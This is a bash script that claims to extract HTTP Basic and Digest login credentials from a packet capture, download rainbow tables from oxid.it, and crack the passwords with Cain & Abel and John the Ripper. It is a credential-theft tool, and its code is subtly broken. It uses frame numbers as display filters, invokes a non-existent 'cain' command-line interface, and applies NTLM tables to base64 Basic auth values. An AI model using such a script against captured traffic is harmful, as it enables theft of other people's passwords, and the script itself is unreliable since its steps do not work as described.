#!/bin/bash

check_wireshark() {
    if ! command -v wireshark &> /dev/null
    then
        echo "Wireshark is not installed. Please install it first."
        exit 1
    fi
}

check_cain_abel() {
    if ! command -v cain &> /dev/null
    then
        echo "Cain & Abel is not installed. Please install it first."
        exit 2
    fi
}

check_john() {
    if ! command -v john &> /dev/null
    then
        echo "John the Ripper is not installed. Please install it first."
        exit 3
    fi
}

check_pcap_file() {
    if [ -z "$1" ]
    then
        echo "Please provide a pcap file as an argument."
        exit 4
    fi
}

check_file_access() {
    if [ ! -f "$1" ] || [ ! -r "$1" ]
    then
        echo "The pcap file does not exist or is not readable."
        exit 5
    fi
}

create_tmpdir() {
    TMPDIR=$(mktemp -d)
}

sniff_passwords() {
    i=1
    while read -r packet
    do
        echo "Sniffing password $i..."
        tshark -r "$1" -Y "$packet" -T fields -e http.authbasic -e http.authdigest > "$TMPDIR/password$i.txt"
        i=$((i+1))
    done < <(tshark -r "$1" -T fields -e frame.number -Y "http.authbasic or http.authdigest")
}

download_rainbow_tables() {
    echo "Downloading rainbow tables..."
    curl -L https://www.oxid.it/downloads/rt_ca_setup.zip > "$TMPDIR/rt_ca_setup.zip"
    unzip "$TMPDIR/rt_ca_setup.zip" -d "$TMPDIR"
}

crack_passwords() {
    j=1
    for file in "$TMPDIR"/password*.txt; do
        echo "Cracking password $j..."
        cain -t 0x1000 -f "$TMPDIR/rt_ca_setup/tables/ntlm_ascii-32-95#1-8_0.rt" -b "$(cat $file)" > "$TMPDIR/cracked$j.txt"
        j=$((j+1))
    done    
}

analyze_passwords() {
    k=1
    for file in "$TMPDIR"/cracked*.txt; do
        echo "Analyzing password $k..."
        john --wordlist="$file" --rules --stdout > "$TMPDIR/analyzed$k.txt"
        k=$((k+1))
    done    
}

display_results() {
    cat "$TMPDIR"/*.txt
}

remove_tmpdir() {
    rm -rf "$TMPDIR"
}

check_wireshark
check_cain_abel
check_john
check_pcap_file "$1"
check_file_access "$1"
create_tmpdir
sniff_passwords "$1"
download_rainbow_tables
crack_passwords
analyze_passwords
display_results
remove_tmpdir
